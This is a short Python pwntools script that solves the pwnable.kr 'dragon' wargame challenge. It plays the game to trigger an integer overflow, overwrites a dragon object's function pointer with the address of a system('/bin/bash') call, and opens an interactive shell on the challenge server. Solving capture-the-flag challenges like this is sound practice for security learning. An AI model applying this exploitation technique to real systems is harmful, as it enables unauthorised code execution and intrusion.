from pwn import *

p = remote("pwnable.kr",9004)
#p = process("./dragon")
# Choose Knight against Baby Dragon
p.sendline(b"2")
# Use Frenzy and lose
p.sendline(b"2")
# Choose Priest against Mama Dragon
p.sendline(b"1")
# Hold on with HolyShield + HolyShield + Clarity until you unleash an integer overflow
while b"Well Done Hero! You Killed The Dragon!" not in p.recv():
    p.sendline(b"3\n3\n2")
    pause(1)
# Overwrite Dragon->PrintMonsterInfo with system("/bin/bash") address
p.sendline(p32(0x08048dbf))
# Shell
p.interactive()
